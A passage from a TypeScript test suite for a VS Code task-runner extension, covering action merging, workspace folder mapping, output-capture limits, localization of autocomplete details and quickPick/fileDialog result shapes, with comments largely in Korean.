			const { merged, skipped } = mergeImportedActions(existing, imported);
			assert.strictEqual(merged.length, 2);
			assert.strictEqual(skipped.length, 0);
		});

		test('should skip duplicate ids', () => {
			const existing: ActionItem[] = [{ id: 'action.1', title: 'Existing' }];
			const imported: ActionItem[] = [
				{ id: 'action.1', title: 'Duplicate' },
				{ id: 'action.2', title: 'New' }
			];
			const { merged, skipped } = mergeImportedActions(existing, imported);
			assert.strictEqual(merged.length, 2);
			assert.strictEqual(skipped.length, 1);
			assert.strictEqual(skipped[0], 'action.1');
			assert.strictEqual(merged[1].id, 'action.2');
		});

		test('should detect duplicates in nested children', () => {
			const existing: ActionItem[] = [{
				id: 'folder.1', title: 'Folder', type: 'folder',
				children: [{ id: 'nested.1', title: 'Nested' }]
			}];
			const imported: ActionItem[] = [{ id: 'nested.1', title: 'Duplicate Nested' }];
			const { merged, skipped } = mergeImportedActions(existing, imported);
			assert.strictEqual(skipped.length, 1);
			assert.strictEqual(skipped[0], 'nested.1');
		});

		test('should skip imported folder whose nested child collides with existing', () => {
			const existing: ActionItem[] = [{ id: 'nested.1', title: 'Existing' }];
			const imported: ActionItem[] = [{
				id: 'folder.1', title: 'Imported Folder', type: 'folder',
				children: [{ id: 'nested.1', title: 'Duplicate' }]
			}];
			const { merged, skipped } = mergeImportedActions(existing, imported);
			assert.strictEqual(merged.length, 1, 'imported folder must not be merged when its nested child collides');
			assert.ok(skipped.includes('nested.1'), 'nested conflicting id should be reported as skipped');
			assert.strictEqual(merged[0].id, 'nested.1');
		});

		test('should merge imported folder with unique nested children', () => {
			const existing: ActionItem[] = [{ id: 'a', title: 'A' }];
			const imported: ActionItem[] = [{
				id: 'folder.1', title: 'Imported Folder', type: 'folder',
				children: [{ id: 'b', title: 'B' }, { id: 'c', title: 'C' }]
			}];
			const { merged, skipped } = mergeImportedActions(existing, imported);
			assert.strictEqual(skipped.length, 0);
			assert.strictEqual(merged.length, 2);
			assert.strictEqual(merged[1].id, 'folder.1');
		});

		test('should handle empty existing actions', () => {
			const imported: ActionItem[] = [{ id: 'new.1', title: 'New' }];
			const { merged, skipped } = mergeImportedActions([], imported);
			assert.strictEqual(merged.length, 1);
			assert.strictEqual(skipped.length, 0);
		});

		test('should handle empty imported actions', () => {
			const existing: ActionItem[] = [{ id: 'existing.1', title: 'Existing' }];
			const { merged, skipped } = mergeImportedActions(existing, []);
			assert.strictEqual(merged.length, 1);
			assert.strictEqual(skipped.length, 0);
		});
	});

	suite('mergeActions (preset merge strategies)', () => {
		const existing: ActionItem[] = [
			{ id: 'shared', title: 'Existing Shared' },
			{ id: 'only-existing', title: 'Only Existing' }
		];
		const preset: ActionItem[] = [
			{ id: 'shared', title: 'Preset Shared' },
			{ id: 'only-preset', title: 'Only Preset' }
		];

		test('keep-existing: preset wins for unique IDs only, existing kept on conflict', () => {
			const merged = mergeActions(existing, preset, 'keep-existing');
			const byId = new Map(merged.map(a => [a.id, a]));
			assert.strictEqual(byId.get('shared')?.title, 'Existing Shared');
			assert.ok(byId.has('only-preset'));
			assert.ok(byId.has('only-existing'));
		});

		test('use-preset: conflicting preset action actually wins (regression)', () => {
			// Regression for the bug where the "Use preset" QuickPick option
			// silently behaved like "Keep existing" because mergeActions always
			// filtered preset items by existing IDs.
			const merged = mergeActions(existing, preset, 'use-preset');
			const byId = new Map(merged.map(a => [a.id, a]));
			assert.strictEqual(
				byId.get('shared')?.title,
				'Preset Shared',
				'preset entry must win when strategy is use-preset'
			);
			assert.ok(byId.has('only-preset'));
			assert.ok(byId.has('only-existing'));
		});

		test('keep-both: existing and preset coexist, with preset conflicts dropped', () => {
			const merged = mergeActions(existing, preset, 'keep-both');
			const byId = new Map(merged.map(a => [a.id, a]));
			assert.strictEqual(byId.get('shared')?.title, 'Existing Shared');
			assert.ok(byId.has('only-preset'));
			assert.ok(byId.has('only-existing'));
		});
	});

	/**
	 * **병합 승자와 폴더 매핑은 같은 것을 가리켜야 한다.**
	 *
	 * 예전에는 병합이 뒤쪽 폴더를, 매핑이 앞쪽 폴더를 택해 B 폴더의 명령이
	 * A 폴더의 cwd 와 `${workspaceFolder}` 로 실행됐다. 중복 id 는 경고만 찍고
	 * 통과하므로 아무도 막지 않았다. 두 승자가 갈라지는 순간을 잡는 것이
	 * 이 suite 의 목적이다.
	 */
	suite('resolveWorkspaceActions (병합 승자 = 폴더 매핑 승자)', () => {
		const folderA = path.resolve('/tmp/ws-a');
		const folderB = path.resolve('/tmp/ws-b');
		const sources = [
			{ actions: [{ id: 'dup', title: 'From A' }, { id: 'only-a', title: 'Only A' }], workspaceFolderPath: folderA },
			{ actions: [{ id: 'dup', title: 'From B' }, { id: 'only-b', title: 'Only B' }], workspaceFolderPath: folderB },
		];

		test('중복 id 는 병합 결과와 폴더 매핑이 같은 폴더를 가리킨다', () => {
			const { merged, folderById } = resolveWorkspaceActions([], sources);
			const winner = merged.find(a => a.id === 'dup');
			assert.strictEqual(winner?.title, 'From B', '병합은 마지막으로 정의한 폴더를 택한다');
			assert.strictEqual(
				folderById.get('dup'), folderB,
				'폴더 매핑이 병합 승자와 다른 폴더를 가리킨다 — 명령이 엉뚱한 cwd 로 실행된다'
			);
		});

		test('충돌하지 않는 액션은 각자의 폴더에 매핑된다', () => {
			const { merged, folderById } = resolveWorkspaceActions([], sources);
			assert.strictEqual(folderById.get('only-a'), folderA);
			assert.strictEqual(folderById.get('only-b'), folderB);
			assert.deepStrictEqual(
				merged.map(a => a.id).sort(),
				['dup', 'only-a', 'only-b'],
				'충돌한 쪽만 하나로 접히고 나머지는 모두 남아야 한다'
			);
		});

		test('중첩된 children 의 id 도 매핑된다', () => {
			const nested = [{
				actions: [{ id: 'group', title: 'G', children: [{ id: 'child', title: 'C' }] }],
				workspaceFolderPath: folderA,
			}];
			const { folderById } = resolveWorkspaceActions([], nested);
			assert.strictEqual(folderById.get('child'), folderA, '자식 액션도 실행 대상이므로 폴더가 필요하다');
		});

		test('base(번들·preset)는 폴더 매핑을 갖지 않는다', () => {
			// 워크스페이스 밖에서 온 액션에는 소속 폴더가 없다. 여기에 값을
			// 넣으면 번들 예제가 임의의 폴더에서 실행된다.
			const { merged, folderById } = resolveWorkspaceActions([{ id: 'bundled', title: 'B' }], sources);
			assert.ok(merged.some(a => a.id === 'bundled'), 'base 액션이 사라졌다');
			assert.strictEqual(folderById.has('bundled'), false);
		});

		test('액션이 없는 폴더는 건너뛴다', () => {
			const { merged, folderById } = resolveWorkspaceActions([], [
				{ actions: [], workspaceFolderPath: folderA },
				{ actions: [{ id: 'only-b', title: 'Only B' }], workspaceFolderPath: folderB },
			]);
			assert.deepStrictEqual(merged.map(a => a.id), ['only-b']);
			assert.strictEqual(folderById.get('only-b'), folderB);
		});
	});

	suite('toWorkspaceRelativePath', () => {
		test('converts a file inside the workspace to ${workspaceFolder} form', () => {
			const root = path.resolve('/tmp/taskhub-ws');
			const file = path.join(root, 'src', 'index.ts');
			assert.strictEqual(
				toWorkspaceRelativePath(file, root),
				'${workspaceFolder}/src/index.ts'
			);
		});

		test('leaves paths outside the workspace as absolute', () => {
			const root = path.resolve('/tmp/taskhub-ws');
			const outside = path.resolve('/tmp/elsewhere/file.ts');
			assert.strictEqual(toWorkspaceRelativePath(outside, root), outside);
		});

		test('returns raw path when workspaceFolder is missing', () => {
			const file = path.resolve('/tmp/anything/file.ts');
			assert.strictEqual(toWorkspaceRelativePath(file, undefined), file);
		});
	});

	suite('executeShellCommand: capture overflow is a normal failure', () => {
		// POSIX-only — the underlying `sh -c 'yes | head -c ...'` is cross-shell
		// awkward on Windows and the overflow logic itself is identical.
		(process.platform === 'win32' ? test.skip : test)(
			'rejects with the overflow message AND does not mark the action as manually terminated',
			async function () {
				this.timeout(15_000);
				const cfg = vscode.workspace.getConfiguration('taskhub');
				const prevLimit = cfg.get('pipeline.outputCaptureLimitMb');
				await cfg.update('pipeline.outputCaptureLimitMb', 1, vscode.ConfigurationTarget.Global);
				try {
					const actionKey = `test.capture-overflow.${Date.now()}`;
					// `yes | head -c 3000000` reliably emits 3 MB then exits;
					// well above the 1 MB cap set above.
					let caught: Error | undefined;
					try {
						await executeShellCommand(
							'sh',
							['-c', 'yes | head -c 3000000'],
							undefined,
							undefined,
							undefined,
							actionKey
						);
					} catch (e) {
						caught = e as Error;
					}
					assert.ok(caught, 'executeShellCommand should reject when the capture cap is exceeded');
					assert.ok(
						/Captured output exceeded|캡처된 출력이/.test(caught!.message),
						`expected overflow-specific error message, got: ${caught!.message}`
					);
					// Regression: previously the overflow path added to
					// manuallyTerminatedActions, which caused executeAction()
					// to record the failure as "Action stopped by user"
					// instead of the real error. Verify we don't do that
					// anymore.
					assert.strictEqual(
						__testHook_hasManuallyTerminated(actionKey),
						false,
						'capture overflow must not be classified as a user-initiated manual termination'
					);
				} finally {
					await cfg.update('pipeline.outputCaptureLimitMb', prevLimit, vscode.ConfigurationTarget.Global);
				}
			}
		);
	});

	suite('getActionsValidator (module-level cache)', () => {
		test('returns the same compiled validator on repeated calls', () => {
			const first = getActionsValidator();
			const second = getActionsValidator();
			assert.strictEqual(first, second, 'Ajv validator should be cached and reused');
		});

		test('returned validator correctly validates a well-formed action array', () => {
			const validate = getActionsValidator();
			const sample: ActionItem[] = [
				{
					id: 'root.hello',
					title: 'Hello',
					action: {
						description: 'say hi',
						tasks: [{ id: 'say', type: 'shell', command: 'echo hi' }]
					}
				}
			];
			const ok = validate(sample);
			assert.strictEqual(ok, true, `Expected valid actions to pass; errors: ${JSON.stringify(validate.errors)}`);
		});

		test('returned validator rejects malformed input', () => {
			const validate = getActionsValidator();
			// Missing `title` is required by the schema.
			const bad: any = [{ id: 'broken', action: { tasks: [] } }];
			const ok = validate(bad);
			assert.strictEqual(ok, false, 'Expected malformed actions to be rejected');
		});
	});

	suite('invalidateActionsCache', () => {
		test('is a callable function returning undefined', () => {
			assert.strictEqual(typeof invalidateActionsCache, 'function');
			assert.strictEqual(invalidateActionsCache(), undefined);
		});

		test('can be called multiple times without throwing', () => {
			assert.doesNotThrow(() => {
				invalidateActionsCache();
				invalidateActionsCache();
				invalidateActionsCache();
			});
		});
	});

	suite('Provider constructors (deferred load)', () => {
		// Build a minimal stub ExtensionContext for constructor tests.
		const makeStubContext = (): vscode.ExtensionContext => {
			const nowhere = path.join(os.tmpdir(), `taskhub-nonexistent-${Date.now()}`);
			return {
				extensionPath: nowhere,
				subscriptions: [],
				workspaceState: {
					get: () => undefined,
					update: () => Promise.resolve(),
					keys: () => []
				},
				globalState: {
					get: () => undefined,
					update: () => Promise.resolve(),
					keys: () => [],
					setKeysForSync: () => {}
				},
				extensionMode: 1,
				extension: { packageJSON: { version: '0.0.0-test' } }
			} as unknown as vscode.ExtensionContext;
		};

		// These tests assert the providers' observable `loaded` flag directly.
		// Node's `fs` module on this runtime exposes its members as
		// non-configurable getters, which blocks a traditional monkey-patch spy.
		// The `loaded` flag was introduced specifically so regressions that
		// reintroduce eager JSON reads in the constructor (e.g. `this.cachedX =
		// this.loadX()`) are detected: the flag stays `false` until a load path
		// actually runs.

		test('LinkViewProvider leaves loaded=false and cachedEntries=[] after construction', () => {
			const provider = new LinkViewProvider() as any;
			assert.strictEqual(provider.loaded, false, 'loaded flag must be false — constructor must not perform a load');
			assert.deepStrictEqual(provider.cachedEntries, [], 'cachedEntries must be the initial empty array');
		});

		test('FavoriteViewProvider leaves loaded=false and cachedFavorites=[] after construction', () => {
			const provider = new FavoriteViewProvider(makeStubContext()) as any;
			assert.strictEqual(provider.loaded, false);
			assert.deepStrictEqual(provider.cachedFavorites, []);
		});

		test('LinkViewProvider.refresh() transitions loaded to true and triggers the load path', () => {
			const provider = new LinkViewProvider() as any;
			assert.strictEqual(provider.loaded, false);
			provider.refresh();
			assert.strictEqual(provider.loaded, true, 'refresh() must set loaded=true so subsequent ensureCache() calls are cheap');
		});

		test('FavoriteViewProvider.refresh() transitions loaded to true and triggers the load path', () => {
			const provider = new FavoriteViewProvider(makeStubContext()) as any;
			assert.strictEqual(provider.loaded, false);
			provider.refresh();
			assert.strictEqual(provider.loaded, true);
		});

		test('LinkViewProvider.getChildren() lazily loads on first call, becomes no-op on repeat', async () => {
			const provider = new LinkViewProvider() as any;
			assert.strictEqual(provider.loaded, false);
			const first = await provider.getChildren();
			assert.strictEqual(provider.loaded, true, 'first getChildren() call must trigger the lazy load');
			assert.strictEqual(first.length, 0);
			const second = await provider.getChildren();
			assert.strictEqual(provider.loaded, true, 'second getChildren() call must keep loaded=true');
			assert.strictEqual(second.length, 0);
		});

		test('FavoriteViewProvider.getChildren() lazily loads on first call, becomes no-op on repeat', async () => {
			const provider = new FavoriteViewProvider(makeStubContext()) as any;
			assert.strictEqual(provider.loaded, false);
			const first = await provider.getChildren();
			assert.strictEqual(provider.loaded, true);
			assert.strictEqual(first.length, 0);
			const second = await provider.getChildren();
			assert.strictEqual(provider.loaded, true);
			assert.strictEqual(second.length, 0);
		});
	});

	/**
	 * 자동완성 `detail` 의 i18n 경계.
	 *
	 * `variableCompletions` 는 `vscode` 를 import 하지 않는 순수 모듈이라 `t()` 를
	 * 쓸 수 없다. 그래서 종류만 돌려주고 문구는 이 함수가 만드는데, 그 경계가
	 * 무너지면 **오류 없이** 한국어 사용자의 자동완성 위젯에 영어만 보인다.
	 */
	suite('describeVariableCompletion (자동완성 detail i18n)', () => {
		/**
		 * `vscode.env.language` 를 고정한 채 실행한다. 호스트 로케일에 기대면
		 * 영어 CI 에서는 한국어 분기가 **한 번도 실행되지 않아**, 번역을 빠뜨려도
		 * 통과한다 — 이 테스트가 막으려는 결함 그 자체다.
		 * (`webviewStringCoverage.test.ts` 의 `withLanguage` 와 같은 방식.)
		 */
		function withLanguage<T>(language: string, body: () => T): T {
			const descriptor = Object.getOwnPropertyDescriptor(vscode.env, 'language');
			assert.ok(
				descriptor && (descriptor.configurable || typeof descriptor.set === 'function'),
				'vscode.env.language를 고정할 수 없다.'
			);
			Object.defineProperty(vscode.env, 'language', { value: language, configurable: true });
			try {
				return body();
			} finally {
				Object.defineProperty(vscode.env, 'language', descriptor!);
			}
		}

		const cases: VariableCompletionDetail[] = [
			{ kind: 'task', taskType: 'fileDialog' },
			{ kind: 'task' },
			{ kind: 'builtin', ref: 'workspaceFolder' },
			{ kind: 'builtin', ref: 'extensionPath' },
			{ kind: 'builtin', ref: 'file' },
			{ kind: 'builtin', ref: 'selectedText' },
			{ kind: 'environment' },
			{ kind: 'environment', variable: 'PATH' },
			{ kind: 'result', taskType: 'quickPick' },
			{ kind: 'capture', taskId: 'build' },
		];

		test('한국어 로케일에서는 모든 종류가 한글 문구를 낸다', () => {
			withLanguage('ko', () => {
				for (const detail of cases) {
					const got = describeVariableCompletion(detail);
					assert.match(got, /[가-힣]/, `번역되지 않았다: ${JSON.stringify(detail)} → ${got}`);
				}
			});
		});

		test('영어 로케일에서는 한글이 섞이지 않는다', () => {
			withLanguage('en', () => {
				for (const detail of cases) {
					const got = describeVariableCompletion(detail);
					assert.ok(got.length > 0, `빈 문구: ${JSON.stringify(detail)}`);
					assert.doesNotMatch(got, /[가-힣]/, `영어 로케일에 한글이 섞였다: ${got}`);
				}
			});
		});

		test('타입 이름과 태스크 id 는 번역하지 않고 그대로 싣는다', () => {
			// 사용자가 actions.json 에 적은 식별자다. 번역하면 무엇을 가리키는지
			// 알 수 없어진다 (CLAUDE.md 의 "짧은 영어 식별자" 예외).
			assert.ok(describeVariableCompletion({ kind: 'result', taskType: 'folderDialog' }).includes('folderDialog'));
			assert.ok(describeVariableCompletion({ kind: 'task', taskType: 'stringManipulation' }).includes('stringManipulation'));
			assert.ok(describeVariableCompletion({ kind: 'capture', taskId: 'build' }).includes('build'));
		});

		test('collectVariableCompletions 가 내는 detail 이 전부 문구로 옮겨진다', () => {
			// 두 모듈이 같은 union 을 쓰는지 실제 출력으로 확인한다 — 새 종류가
			// 늘었는데 여기를 잊으면 그 항목만 빈 detail 로 나간다.
			const fixture = `[
  { "id": "a", "title": "t", "action": { "description": "d", "tasks": [
    { "id": "build", "type": "shell", "command": "make", "passTheResultToNextTask": true,
      "output": { "capture": { "name": "version", "regex": "v(\\\\d+)" } } },
    { "id": "tag", "type": "shell", "command": "git tag \${build." }
  ] } }
]`;
			const offset = fixture.indexOf('${build.') + '${build.'.length;
			const entries = collectVariableCompletions(fixture, offset);
			assert.ok(entries.length > 0, '픽스처가 아무것도 내지 않는다');
			for (const entry of entries) {
				assert.ok(describeVariableCompletion(entry.detail).length > 0, `빈 detail: ${entry.name}`);
			}
		});
	});

	/**
	 * `${id.values}` 의 모양 계약 (런타임 ↔ 시뮬레이션).
	 *
	 * 이 키는 두 곳에서 만들어진다 — 실제로 실행하는 `handleQuickPick` 과,
	 * Preview · Doctor · 자동완성이 함께 쓰는 `simulateTaskResult`. 둘이 갈리면
	 * 아무 오류 없이 **다른 값**이 된다: 0.6.57 부터 배열은 문자열 자리에서
	 * 공백으로 이어 붙으므로, 시뮬레이션만 배열이 되면 Preview 는 `a b` 를
	 * 보여 주고 런타임은 `a,b` 를 넘긴다.
	 *
	 * 런타임 쪽은 반환 타입(`values?: string`)을 컴파일러가 지켜 준다. 무방비인
	 * 것은 시뮬레이션 쪽으로, `SimulatedResult` 의 값 타입이
	 * `string | string[] | number` 라 배열로 바꿔도 빌드가 깨지지 않는다
	 * (`fileDialog` 의 `paths` 가 실제로 배열이다). 그쪽을 여기서 묶는다.
	 */
	suite('프롬프트 결과 모양 (런타임 ↔ 시뮬레이션)', () => {
		async function runtimeQuickPick(task: any, picked: any) {
			const original = vscode.window.showQuickPick;
			// VS Code 는 **넘긴 항목 객체 그대로** 돌려준다. label 만 담은 가짜
			// 객체를 돌려주는 스텁은 런타임이 항목에 얹어 둔 정보를 잃어버려,
			// 계약 테스트가 실제로 도는 코드와 다른 것을 검사하게 된다.
			(vscode.window as any).showQuickPick = async (items: any[]) => {
				const wanted: string[] = (Array.isArray(picked) ? picked : [picked])
					.map((entry: any) => entry?.label);
				const matched = items.filter(item => wanted.includes(item.label));
				return Array.isArray(picked) ? matched : matched[0];
			};
			try {
				return await handleQuickPick(task);
			} finally {
				(vscode.window as any).showQuickPick = original;
			}
		}

		async function advancedQuickPick(
			task: any,
			interact: (picker: any, controls: { type(value: string): void; accept(): void }) => void
		) {
			const original = vscode.window.createQuickPick;
			const acceptListeners: Array<() => void> = [];
			const hideListeners: Array<() => void> = [];
			const valueListeners: Array<(value: string) => void> = [];
			const event = <T extends Function>(listeners: T[]) => (listener: T) => {
				listeners.push(listener);
				return { dispose: () => {
					const index = listeners.indexOf(listener);
					if (index >= 0) { listeners.splice(index, 1); }
				} };
			};
			const picker: any = {
				items: [], selectedItems: [], activeItems: [], value: '',
				canSelectMany: false,
				onDidAccept: event(acceptListeners),
				onDidHide: event(hideListeners),
				onDidChangeValue: event(valueListeners),
				show: () => queueMicrotask(() => interact(picker, {
					type: (value: string) => {
						picker.value = value;
						for (const listener of [...valueListeners]) { listener(value); }
					},
					accept: () => {
						for (const listener of [...acceptListeners]) { listener(); }
					},
				})),
				hide: () => { for (const listener of [...hideListeners]) { listener(); } },
				dispose: () => undefined,
			};
			(vscode.window as any).createQuickPick = () => picker;
			try {
				return await handleQuickPick(task);
			} finally {
				(vscode.window as any).createQuickPick = original;
			}
		}

		/**
		 * `value` 매핑 — 목록에 **보이는 문구**와 명령에 **들어가는 값**을 가른다.
		 * 매핑이 없으면 둘이 같으므로 예전 액션의 동작은 그대로다.
		 */
		test('value 매핑: label 은 보이는 문구, value 는 명령에 들어가는 값', async () => {
			const task = {
				id: 'pick', type: 'quickPick',
				items: [
					{ label: 'With option', value: '--with-option' },
					{ label: 'Plain' },
				],
			};
			const mapped = await runtimeQuickPick(task, { label: 'With option' });
			assert.strictEqual(mapped.value, '--with-option');
			assert.strictEqual(mapped.label, 'With option', 'label 은 매핑과 무관하게 표시 문구다');
			assert.deepStrictEqual(mapped.valueList, ['--with-option']);

			const plain = await runtimeQuickPick(task, { label: 'Plain' });
			assert.strictEqual(plain.value, 'Plain', 'value 가 없으면 label 이 그대로 값이다');
		});

		test('default label을 처음 활성화하고 매핑된 value를 낸다', async () => {
			const result = await advancedQuickPick({
				id: 'pick', type: 'quickPick', default: 'Release',
				items: [{ label: 'Debug', value: '--debug' }, { label: 'Release', value: '--release' }],
			}, (picker, controls) => {
				assert.strictEqual(picker.activeItems[0]?.label, 'Release');
				picker.selectedItems = [...picker.activeItems];
				controls.accept();
			});
			assert.strictEqual(result.label, 'Release');
			assert.strictEqual(result.value, '--release');
		});

		test('다중 선택의 default label 배열을 미리 선택한다', async () => {
			const result = await advancedQuickPick({
				id: 'pick', type: 'quickPick', canPickMany: true,
				default: ['A', 'C'], items: ['A', 'B', 'C'],
			}, (picker, controls) => {
				assert.deepStrictEqual(picker.selectedItems.map((item: any) => item.label), ['A', 'C']);
				controls.accept();
			});
			assert.strictEqual(result.labels, 'A,C');
			assert.deepStrictEqual(result.valueList, ['A', 'C']);
		});

		test('allowCustom은 목록에 없는 직접 입력을 그대로 값으로 낸다', async () => {
			const result = await advancedQuickPick({
				id: 'branch', type: 'quickPick', allowCustom: true, items: ['main', 'develop'],
			}, (picker, controls) => {
				controls.type('feature/new-flow');
				assert.strictEqual(picker.activeItems[0]?.taskHubCustom, true);
				picker.selectedItems = [...picker.activeItems];
				controls.accept();
			});
			assert.deepStrictEqual(result, {
				label: 'feature/new-flow', value: 'feature/new-flow', valueList: ['feature/new-flow'],
			});
		});

		test('rememberLastSelection은 action/task별 마지막 label을 다음 실행에 복원한다', async () => {
			const store = new Map<string, unknown>();
			initQuickPickMemory({
				workspaceState: {
					get: <T>(key: string) => store.get(key) as T | undefined,
					update: async (key: string, value: unknown) => { store.set(key, value); },
				},
			});
			const task = {
				actionId: 'build', id: 'mode', type: 'quickPick',
				rememberLastSelection: true, items: ['Debug', 'Release'],
			};
			try {
				await advancedQuickPick(task, (picker, controls) => {
					const release = picker.items.find((item: any) => item.label === 'Release');
					picker.activeItems = [release];
					picker.selectedItems = [release];
					controls.accept();
				});
				const restored = await advancedQuickPick(task, (picker, controls) => {
					assert.strictEqual(picker.activeItems[0]?.label, 'Release');
					picker.selectedItems = [...picker.activeItems];
					controls.accept();
				});
				assert.strictEqual(restored.value, 'Release');
			} finally {
				initQuickPickMemory(undefined);
			}
		});

		test('allowCustom과 canPickMany를 함께 쓰면 명확히 거부한다', async () => {
			await assert.rejects(
				() => handleQuickPick({
					id: 'pick', type: 'quickPick', allowCustom: true, canPickMany: true, items: ['a'],
				}),
				/allowCustom.*canPickMany/
			);
		});

		test('value 배열: 인자 여러 개 / 아무 인자도 없음', async () => {
			const task = {
				id: 'pick', type: 'quickPick',
				items: [
					{ label: 'B', value: ['--option', 'b'] },
					{ label: 'None', value: [] },
				],
			};
			const two = await runtimeQuickPick(task, { label: 'B' });
			assert.deepStrictEqual(two.value, ['--option', 'b']);
			assert.deepStrictEqual(
				expandArgTemplate('${pick.value}', { pick: two }), ['--option', 'b'],
				'배열 매핑이 args 에서 인자 둘로 펼쳐지지 않았다'
			);
			assert.deepStrictEqual(
				interpolateCommandPreservingTokens('tool ${pick.value} in.c', { pick: two }),
				'"tool" "--option" "b" "in.c"',
				'명령 토큰 자리에서도 같은 규칙이어야 한다'
			);

			const none = await runtimeQuickPick(task, { label: 'None' });
			assert.deepStrictEqual(none.value, []);
			assert.deepStrictEqual(
				expandArgTemplate('${pick.value}', { pick: none }), [],
				'빈 배열이 빈 인자로 남으면 "옵션 없음" 이 되지 않는다'
			);
		});

		/**
		 * 문자열이 아닌 매핑 원소를 그대로 인자로 넘기면 `[object Object]` 가 명령에
		 * 들어간다. 값에서 빼는 편이 낫다는 판단을 여기서 고정한다.
		 */
		test('문자열이 아닌 매핑 원소는 값에서 빠진다', async () => {
			const mixed = await runtimeQuickPick(
				{ id: 'pick', type: 'quickPick', items: [{ label: 'M', value: [1, 'a', null] }] },
				{ label: 'M' }
			);
			assert.deepStrictEqual(mixed.value, ['a']);
			// `value: null` 은 매핑이 아니므로 label 로 떨어진다.
			const nulled = await runtimeQuickPick(
				{ id: 'pick', type: 'quickPick', items: [{ label: 'N', value: null }] },
				{ label: 'N' }
			);
			assert.strictEqual(nulled.value, 'N');
		});

		test('다중 선택도 매핑된 값을 잇는다', async () => {
			const runtime = await runtimeQuickPick(
				{
					id: 'pick', type: 'quickPick', canPickMany: true,
					items: [{ label: 'A', value: '-a' }, { label: 'B', value: ['-b', '1'] }],
				},
				[{ label: 'A' }, { label: 'B' }]
			);
			assert.deepStrictEqual(runtime.valueList, ['-a', '-b', '1']);
			assert.strictEqual(runtime.values, '-a,-b,1');
			assert.strictEqual(runtime.labels, 'A,B', 'labels 는 표시 문구를 그대로 남긴다');
		});

		test('다중 선택: 키 집합이 같고 values 는 양쪽 다 문자열이다', async () => {
			const runtime = await runtimeQuickPick(
				{ id: 'pick', type: 'quickPick', items: ['a', 'b'], canPickMany: true },
				[{ label: 'a' }, { label: 'b' }]
			);
			const simulated = simulateTaskResult({ id: 'pick', type: 'quickPick', canPickMany: true } as any);
			assert.strictEqual(runtime.values, 'a,b', '런타임은 쉼표로 잇는다');
			assert.deepStrictEqual(
				Object.keys(simulated).sort(), Object.keys(runtime).sort(),
				'키 집합이 갈리면 없는 참조를 제안하거나 있는 참조를 미해결로 잡는다'
			);
			assert.strictEqual(
				typeof simulated.values, typeof runtime.values,
				'시뮬레이션만 배열이 되면 문자열 자리에서 공백 결합이라 런타임의 join(",") 과 갈린다'
			);
		});

		test('단일 선택: 양쪽 다 values 를 내지 않는다', async () => {
			// 여기서 시뮬레이션만 `values` 를 내면 단일 선택 액션의
			// `${pick.values}` 가 Preview 에서는 해석된 것처럼 보이고 런타임에서는
			// 리터럴로 남는다.
			const runtime = await runtimeQuickPick(
				{ id: 'pick', type: 'quickPick', items: ['a', 'b'] },
				{ label: 'a' }
			);
			const simulated = simulateTaskResult({ id: 'pick', type: 'quickPick' } as any);
			assert.strictEqual(runtime.values, undefined);
			assert.deepStrictEqual(Object.keys(simulated).sort(), Object.keys(runtime).sort());
		});

		/**
		 * `fileDialog` 는 시뮬레이션이 **일부러 문자열이 아닌 값**을 내는 유일한
		 * 자리다 — `paths` · `names` 는 배열, `count` 는 숫자. `args` 배열 확장을
		 * 미리보기가 실제와 같은 개수로 보여 주려면 그래야 한다. 그래서 위
		 * quickPick 보다 어긋나기 쉬운 쪽이고, 어긋나면 미리보기의 인자 개수가
		 * 실행과 달라진다.
		 */
		for (const many of [true, false]) {
			test(`fileDialog(canSelectMany=${many}): 키 집합과 각 키의 모양이 같다`, async () => {
				const originalDialog = vscode.window.showOpenDialog;
				const picked = many
					? [vscode.Uri.file('/tmp/a.txt'), vscode.Uri.file('/tmp/b.txt')]
					: [vscode.Uri.file('/tmp/a.txt')];
				(vscode.window as any).showOpenDialog = async () => picked;
				let runtime: Record<string, unknown>;
				try {
					runtime = await handleFileDialog({ id: 'pick', type: 'fileDialog', options: { canSelectMany: many } }) as unknown as Record<string, unknown>;
				} finally {
					(vscode.window as any).showOpenDialog = originalDialog;
				}
				const simulated = simulateTaskResult({
					id: 'pick', type: 'fileDialog', options: { canSelectMany: many }
				} as any) as Record<string, unknown>;

				assert.deepStrictEqual(Object.keys(simulated).sort(), Object.keys(runtime).sort());
				for (const key of Object.keys(runtime)) {
					assert.strictEqual(
						Array.isArray(simulated[key]), Array.isArray(runtime[key]),
						`${key} 의 배열 여부가 다르다 — 배열은 문자열 자리에서 공백으로 이어 붙고 args 에서는 인자 여러 개로 펼쳐진다`
					);
					assert.strictEqual(typeof simulated[key], typeof runtime[key], `${key} 의 타입이 다르다`);
				}
				assert.strictEqual(simulated.count, picked.length, '개수까지 흉내 내야 args 확장이 실제와 같은 수로 보인다');
			});
		}
	});
});
